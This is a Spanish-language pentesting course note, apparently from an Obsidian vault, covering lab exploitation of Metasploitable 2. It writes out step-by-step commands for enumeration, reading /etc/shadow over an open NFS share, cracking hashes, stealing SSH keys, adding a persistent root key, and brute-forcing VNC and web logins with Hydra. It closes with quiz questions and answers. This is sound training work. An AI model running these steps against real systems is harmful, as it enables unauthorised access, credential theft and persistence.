
> [!info] Relacionado con
> [[Explotación de Servicios - Linux]] · [[Explotación de Servicios - Windows]] · [[Escalada de Privilegios]] · [[Fuzzing Web con ffuf]] · [[Burp Suite - Framework de Auditoría]]

---

## ⚠️ Recordatorio de laboratorio

Todo sobre **Metasploitable 2** en red aislada (VMware host-only o NAT interno). Nunca exponer la VM a internet.

| Rol | Sistema |
|-----|---------|
| **Atacante** | Kali Linux actualizada |
| **Víctima** | Metasploitable 2 (IP ejemplo: 10.0.2.5, Kali: 10.0.2.15) |

> [!tip] VMware vs VirtualBox
> Daniel recomienda **VMware**. VirtualBox suele dar problemas con el portapapeles bidireccional y el arrastre de archivos. Alternativa para transferir: crear una **carpeta compartida** entre host y VM.

---

## ① Punto de partida: Nmap

```bash
nmap -sCV 10.0.2.5 --min-rate=5000 -p-
# -p- escanea los 65.535 puertos
# Presionar V durante el escaneo para ver el porcentaje
```

Puertos ya vistos en la sesión anterior (21, 22, 23, 80, 139/445). Esta sesión continúa con los restantes.

---

## ② Puerto 80 — HTTP: fuzzing de directorios

### Fuzzing con [[FFUF|ffuf]]

```bash
[[FFUF]] -u http://10.0.2.5/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

| Parámetro | Función |
|-----------|---------|
| `FUZZ` | Marcador que ffuf sustituye por cada entrada del diccionario |
| `-c` | Colores en el output |
| `-w` | Diccionario a usar |

El diccionario medium tarda más pero encuentra más cosas (ej. `phpinfo`).

**Buscar subdominios** → FUZZ al principio de la URL:

```bash
[[FFUF]] -u http://FUZZ.dominio.com -w diccionario.txt -c
```

### Alternativa: Metasploit `dir_scanner`

```bash
sudo msfconsole
search dir scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.0.2.5
set RPORT 80
run
# Encuentra: cgi, doc, icons... (menos que ffuf con medium)
```

> [!info] COMPARACIÓN
> El escáner de Metasploit es más rápido pero menos completo. [[FFUF|ffuf]] con un diccionario grande encuentra más, incluido `phpinfo.php`.

### Diccionarios recomendados

| Diccionario | Uso principal | Tamaño |
|-------------|--------------|--------|
| `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Fuzzing web (ya en Kali) | Mediano |
| `/usr/share/dirb/wordlists/common.txt` | Fuzzing rápido (ya en Kali) | Pequeño |
| **SecLists** | Todo — web, usuarios, contraseñas, SQLi, LFI... | Muy grande |
| **rockyou.txt** | Romper hashes, fuerza bruta de contraseñas | Grande |
| **Kaonashi** | Contraseñas, se actualiza frecuentemente | Mediano |
| **PayloadsAllTheThings** | Payloads web: XSS, SQLi, LFI, etc. | Variable |

```bash
# Instalar SecLists
sudo git clone https://github.com/danielmiessler/SecLists /usr/share/seclists

# Localizar rockyou (ya en Kali, puede estar comprimido)
locate rockyou.txt
# Si está en .gz: gunzip /usr/share/wordlists/rockyou.txt.gz
```

Los diccionarios se guardan en `/usr/share/wordlists/` o en `~/Desktop` para acceso rápido en el lab.

### Hallazgo clave: robots.txt

> [!tip] REGLA DE ORO
> **Siempre** buscar `robots.txt` en cualquier web que audites. Contiene los directorios que el propietario **no quiere que Google indexe** — eso los hace interesantes para un pentester.

```bash
# Navegar a:
http://10.0.2.5/robots.txt

# También probar en subdirectorios
http://10.0.2.5/twiki/robots.txt
```

En Metasploitable 2, dentro de `robots.txt` de TWiki se encuentra un directorio `passwords` con un archivo que contiene usuarios y contraseñas, y un PHP de configuración con credenciales de BD en texto claro (root, contraseña vacía, BD metasploit).

> [!warning] GUARDA TODO
> Usuarios, contraseñas, hashes, rutas. En la fase de enumeración cuanto más recopilas, más vectores tienes después.

---

## ③ Puerto 25 — SMTP: enumeración de usuarios

SMTP (Simple Mail Transfer Protocol). El valor en pentesting no es enviar correos, sino **enumerar qué usuarios existen**.

### Comandos nativos de SMTP

| Comando | Función |
|---------|---------|
| `VRFY usuario` | Verifica si ese usuario existe |
| `EXPN usuario` | Expande una lista de distribución |
| `EHLO` | Saludo inicial cliente→servidor |

### Enumeración con Metasploit

```bash
sudo msfconsole
search smtp_enum
use 0 # auxiliary/scanner/smtp/smtp_enum
show options
set RHOSTS 10.0.2.5
run
```

### Enumeración con smtp-user-enum

```bash
smtp-user-enum -M VRFY -U usuarios_smtp.txt -t 192.168.52.134
```

> [!tip] MENOS RUIDO
> `smtp-user-enum` es más silencioso que Metasploit para esta tarea.

**Resultado:** lista de usuarios del sistema: backup, bin, daemon, ftp, games, www-data, msfadmin, user...

Guardar estos usuarios en un `.txt` para usar en ataques de fuerza bruta personalizados.

> [!info] ¿QUÉ ES WWW-DATA?
> Es la cuenta de servicio del servidor web (Apache). Si comprometes una app web, obtienes una shell como `www-data` — usuario muy limitado. Desde ahí habría que escalar a un usuario local y después a root.

---

## ④ Puertos 512-514 — Servicios R

Servicios **obsoletos** anteriores a SSH. Conexión remota sin cifrado. En entornos reales es rarísimo; Metasploitable 2 los tiene abiertos y mal configurados.

| Puerto | Servicio |
|--------|----------|
| 512 | rexec |
| 513 | rlogin |
| 514 | rsh |

### Explotación (mala configuración de .rhosts)

El archivo `.rhosts` contiene las IPs autorizadas. En Metasploitable 2 tiene `*` (todas las IPs):

```bash
# Instalar cliente si no está
sudo apt install rsh-redone-client -y

# Conectar directamente como root (sin contraseña)
rlogin -l root 10.0.2.5
whoami # → root
```

> [!danger] PRODUCCIÓN
> Esto funciona porque `.rhosts` está configurado para permitir **cualquier IP**. En producción esto jamás debería existir. SSH sustituyó completamente a estos servicios.

---

## ⑤ Puerto 2049 — NFS ⭐

El bloque más importante de la sesión. NFS es **muy común** en entornos reales y en exámenes de certificación (eJPTv2, OSCP).

**NFS** (Network File System) permite compartir carpetas Linux por red. Va sobre **RPC** (Remote Procedure Call).

### Flujo completo de explotación

**Paso 1 — Confirmar que NFS está activo:**

```bash
rpcinfo -p 10.0.2.5
# Si aparece "nfs" en la lista → NFS abierto (puerto 2049 TCP)
```

**Paso 2 — Listar carpetas compartidas:**

```bash
showmount -e 10.0.2.5
# Resultado: / *
# "/" = raíz del sistema; "*" = accesible desde cualquier IP
```

> [!danger] PELIGRO
> Compartir `/` desde la raíz expone **todo** el sistema de archivos. Cualquier atacante en la misma red puede leer `/etc/shadow`, claves SSH y modificar `authorized_keys`.

**Paso 3 — Crear carpeta local y montar:**

```bash
mkdir ~/Desktop/carpeta_meta2
sudo mount -t nfs 10.0.2.5:/ ~/Desktop/carpeta_meta2
ls ~/Desktop/carpeta_meta2 # ves toda la raíz
```

> [!important] FORMATO
> `IP:carpeta_compartida` (dos puntos + barra). Usar `sudo` si da error de permisos.

**Paso 4 — Explorar el sistema montado:**

```bash
cat ~/Desktop/carpeta_meta2/etc/passwd # usuarios
sudo cat ~/Desktop/carpeta_meta2/etc/shadow # hashes
```

---

## ⑥ Romper hashes: John y Hashcat

Una vez obtenidos los hashes de `/etc/shadow`, el objetivo es obtener las contraseñas en texto claro.

### Identificar tipo de hash

```bash
hash-identifier # pegar el hash → te dice el tipo
```

O mirar el prefijo manualmente:

| Prefijo | Tipo | Hashcat modo |
|---------|------|-------------|
| `$1$` | MD5crypt | 500 |
| `$5$` | SHA-256 | 7400 |
| `$6$` | SHA-512 | 1800 |
| `*` | Cuenta deshabilitada | — |
| `!` | Cuenta bloqueada | — |

### Guardar hashes y romper

```bash
# Copiar las líneas de /etc/shadow al fichero hashes.txt
nano hashes.txt
# Formato: usuario:$1$...:...:...

# Romper con John (MD5crypt):
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Ver resultados (John guarda internamente):
john --show hashes.txt

# Ver progreso:
john --status
```

> [!warning] JOHN NO REPITE
> Si lanzas el mismo comando dos veces, John no muestra nada nuevo. Usa `john --show hashes.txt` para consultar los ya rotos.

### Romper con Hashcat

```bash
# MD5crypt (modo 500):
hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA-512 (modo 1800):
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

# Ver resultados guardados:
hashcat -m 500 hashes.txt --show
```

| Herramienta | Ventaja | Cuándo usarla |
|-------------|---------|---------------|
| **[[John_Hashcat|John]]** | Más sencillo, detecta formato automáticamente | Hashes rápidos, uso general |
| **[[John_Hashcat|Hashcat]]** | Más rápido (GPU), más modos, reglas avanzadas | Hashes difíciles, entornos reales |

> [!tip] PRÁCTICA
> Contraseñas rotas en esta sesión: `sys → batman` · `klog → 123456789` · `service → service`.

---

## ⑦ Claves SSH desde NFS ⭐

Al tener montada la raíz con permisos de lectura y escritura, tenemos dos vectores de ataque SSH.

### Ficheros clave

| Fichero | Función |
|---------|---------|
| `~/.ssh/id_rsa` | **Clave PRIVADA** — la que se roba o genera. Nunca compartir. |
| `~/.ssh/id_rsa.pub` | **Clave PÚBLICA** — la que se deja en el servidor. |
| `~/.ssh/authorized_keys` | Lista de claves públicas autorizadas a conectarse. |

### Vector 1 — Robar la clave privada existente

```bash
# Explorar el .ssh del usuario msfadmin vía NFS
ls -la ~/Desktop/carpeta_meta2/home/msfadmin/.ssh/

# Comprobar quién está autorizado en root
cat ~/Desktop/carpeta_meta2/root/.ssh/authorized_keys
# → La clave pública de msfadmin también está en root

# Copiar la clave privada
cp ~/Desktop/carpeta_meta2/home/msfadmin/.ssh/id_rsa ~/Desktop/id_rsa_robada

# Dar permisos (OBLIGATORIO)
chmod 600 ~/Desktop/id_rsa_robada

# Conectarse como root
ssh -i ~/Desktop/id_rsa_robada root@10.0.2.5
whoami # → root
```

> [!important] POR QUÉ FUNCIONA CON ROOT
> La clave privada de msfadmin estaba protegida con passphrase para ese usuario. Sin embargo, esa misma clave pública estaba en `authorized_keys` de root **sin** protección → entramos como root.

### Vector 2 — Crear nuestra propia clave (persistencia)

```bash
# 1. Generar un par de claves SSH en Kali
ssh-keygen -t rsa -f ~/Desktop/mi_clave_nueva
# Passphrase: Enter (vacío, obligatorio para automatizar)

# 2. Añadir la clave pública al authorized_keys de root en la víctima
# USAR >> (añadir), NUNCA > (sobreescribe y rompe accesos)
cat ~/Desktop/mi_clave_nueva.pub >> ~/Desktop/carpeta_meta2/root/.ssh/authorized_keys

# 3. Verificar
cat ~/Desktop/carpeta_meta2/root/.ssh/authorized_keys
# → Ahora hay N+1 claves autorizadas

# 4. Conectarse con la nueva clave privada
chmod 600 ~/Desktop/mi_clave_nueva
ssh -i ~/Desktop/mi_clave_nueva root@10.0.2.5
whoami # → root
```

> [!warning] >> vs >
> `>>` **añade** al final del archivo (persistencia). `>` sobreescribe y destruye las claves anteriores. En persistencia **siempre usar `>>`**.

> [!tip] RECUERDA
> Los cambios en la carpeta montada por NFS se aplican directamente en el sistema remoto en tiempo real. No es una copia local.

---

## ⑧ Puerto 5900 — VNC: fuerza bruta con Hydra

**VNC** (Virtual Network Computing) permite escritorio remoto gráfico.

```bash
# Fuerza bruta con [[Hydra]]
hydra -P /usr/share/wordlists/rockyou.txt vnc://10.0.2.5
# → Encuentra: contraseña "password"

# Conectarse por VNC
vncviewer 10.0.2.5
# Contraseña: password
# → Escritorio gráfico completo de la víctima
```

---

## ⑨ Web: Burp Suite y análisis

### ¿Qué es Burp Suite?

Un **proxy** que se interpone entre tu navegador y el servidor web. Captura todas las peticiones HTTP antes de que salgan.

```
Navegador → [Burp Suite] → Servidor web
```

### Configuración inicial

1. Instalar **FoxyProxy** en Firefox → configurar: Hostname `127.0.0.1`, Puerto `8080`
2. Burp Suite → Proxy → Intercept → activar "Intercept is on"
3. Activar FoxyProxy en Firefox (icono → seleccionar proxy de Burp)

### Flujo básico

1. Activar FoxyProxy en Firefox
2. Activar Intercept en Burp
3. Navegar a la web objetivo
4. Burp captura la petición → la página se queda "cargando"
5. En Burp: ver/modificar → Forward para enviarla

> [!tip] HISTORIAL HTTP
> Con Intercept desactivado, Burp sigue **registrando todo el tráfico** en HTTP History. Muy útil para auditar sin interrumpir la navegación.

### Herramientas adicionales para análisis web

| Herramienta | Tipo | Función |
|-------------|------|---------|
| **Wappalyzer** | Extensión Firefox/Chrome | Detecta tecnologías (Apache, PHP, CMS...) |
| **WhatWeb** | CLI | `whatweb http://10.0.2.5` — tecnologías desde terminal |

### Fuerza bruta en formularios con [[Hydra]]

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.5 http-post-form \
 "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

| Parámetro | Función |
|-----------|---------|
| `-l admin` | Usuario fijo |
| `-P rockyou.txt` | Diccionario de contraseñas |
| `http-post-form` | Tipo de petición POST |
| `/ruta:campos:mensaje_error` | Ruta del login, parámetros del formulario, texto de error |

> [!tip] NOMBRES DE CAMPOS
> Click derecho → Inspeccionar → buscar los `name=""` de los inputs de usuario y contraseña.

**Resultado:** `admin:password` → entrar en DVWA.

---

## ⑩ Resumen: vectores de esta sesión

| Puerto | Servicio | Vector | Acceso obtenido |
|--------|----------|--------|-----------------|
| 25 | SMTP | Enumeración con `smtp_enum` | Lista de usuarios del sistema |
| 512-514 | Servicios R | `rlogin -l root` (mala config `.rhosts`) | root directo |
| 2049 | NFS | Montar `/` con `mount -t nfs` | Sistema de archivos completo |
| 2049 | NFS | Robar `id_rsa` + `ssh -i` | root por SSH |
| 2049 | NFS | Añadir clave pública a `authorized_keys` | Persistencia como root |
| 5900 | VNC | Fuerza bruta con [[Hydra]] (`password`) | Escritorio remoto |
| 80 | HTTP | `robots.txt` manual | Credenciales y rutas ocultas |
| 80 | HTTP | Fuerza bruta con [[Hydra]] en formulario | Acceso a aplicación web |

---

## ⑪ Preguntas de laboratorio

### NFS

1. ¿Qué comando usas para listar las carpetas compartidas de un servidor NFS? ¿Qué significa que devuelva `/ *`?
2. ¿Cuál es la diferencia entre `>` y `>>` al modificar `authorized_keys`? ¿Por qué es importante en persistencia?
3. Tienes montada la raíz de la víctima en `~/Desktop/carpeta`. ¿Cómo lees el `/etc/shadow`?

### Hashes

4. Ves un hash que empieza por `$6$`. ¿Qué tipo es y qué modo usas en Hashcat?
5. ¿Qué significa que una línea de `/etc/shadow` empiece por `*` o `!`?
6. ¿Por qué John no muestra resultados si lanzas el mismo comando dos veces? ¿Cómo los ves?

### Claves SSH

7. Explica la diferencia entre `id_rsa`, `id_rsa.pub` y `authorized_keys`. ¿Cuál es sensible y cuál no?
8. Has robado la clave privada de msfadmin pero al conectarte como msfadmin te pide contraseña. La misma clave sí funciona para root. ¿Por qué?
9. ¿Qué permiso hay que dar siempre a una clave privada antes de usarla con SSH? ¿Qué pasa si no lo haces?

### Burp Suite

10. ¿Qué diferencia hay entre tener Intercept activado y desactivado en Burp Suite?
11. ¿Para qué sirve el historial HTTP de Burp aunque no estés interceptando?
12. ¿Qué hace FoxyProxy y por qué se usa junto con Burp Suite?

### General

13. ¿Para qué sirve `robots.txt` en una web y por qué es interesante para un pentester?
14. ¿Qué usuario obtienes normalmente al comprometer un servicio web y por qué? ¿Cuál sería el siguiente paso?
15. ¿Por qué Hashcat suele ser más rápido que John the Ripper?

### Respuestas

1. `showmount -e IP`. `/ *` significa que están compartiendo la raíz del sistema y que **cualquier IP puede montarla** → gravísimo.
2. `>` sobreescribe el archivo (destruiría las claves existentes); `>>` añade al final. En persistencia hay que usar `>>` para no romper el acceso legítimo y pasar desapercibido.
3. `sudo cat ~/Desktop/carpeta/etc/shadow`
4. SHA-512. Modo 1800: `hashcat -m 1800 hashes.txt diccionario.txt`
5. La cuenta existe pero está **deshabilitada** — el usuario no puede autenticarse.
6. John guarda los hashes ya rotos en una base de datos interna. Se ven con `john --show hashes.txt`.
7. `id_rsa` = clave privada (sensible, nunca compartir); `id_rsa.pub` = clave pública (no sensible); `authorized_keys` = lista de claves públicas que el servidor acepta.
8. La clave privada de msfadmin estaba protegida con passphrase para ese usuario. Esa misma clave pública estaba añadida en `authorized_keys` de root sin protección adicional.
9. `chmod 600 clave_privada`. Si no lo haces SSH rechaza la clave con error "permissions are too open".
10. Con Intercept activado: Burp **para cada petición** y espera a que la reenvíes manualmente. Con desactivado: el tráfico pasa directamente pero se sigue registrando en el historial.
11. Permite ver todas las peticiones, inspeccionarlas, encontrar parámetros y credenciales aunque no hayas interceptado nada activamente.
12. FoxyProxy redirige el tráfico del navegador al proxy de Burp Suite (`127.0.0.1:8080`) con un solo clic.
13. `robots.txt` dice a los buscadores qué no indexar. Para un pentester: directorios privados, paneles de administración, archivos de configuración → los más interesantes.
14. `www-data`, porque es el usuario que ejecuta Apache. Siguiente paso: escalar a un usuario local y después a root con `sudo -l` o GTFOBins.
15. Hashcat usa la **GPU** (millones de operaciones en paralelo). John usa principalmente la CPU.

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Chema/Maquinas/Explotación avanzada de servicios vulnerables II.md|Explotación avanzada de servicios vulnerables II]]— Kali Linux, SSH, XSS
- [[../../apuntes Joselu/MODULO3/resumen_master_clase23.md|resumen_master_clase23]]— Kali Linux, Metasploit, SSH
- [[../../apuntes Joselu/MODULO3/resumen_master_clase25.md|resumen_master_clase25]]— Escalada de Privilegios, SSH, XSS
- [[Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL.md|Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL]]— Kali Linux, SSH, XSS
- [[../../apuntes Chema/Maquinas/HackTheBox Starting Point — Tier 1.md|HackTheBox Starting Point — Tier 1]]— Escalada de Privilegios, Kali Linux, SSH
- [[../../apuntes Chema/Maquinas/Explotación Avanzada de Servicios Vulnerables III.md|Explotación Avanzada de Servicios Vulnerables III]]— Kali Linux, SSH, XSS

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/FFUF|FFUF]]
- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]

> #burpsuite #certificaciones #escalada-privilegios #ffuf #hydra #john #kali #lfi #linux #metasploit #metasploitable #nmap #redes #sqli #ssh #windows #xss
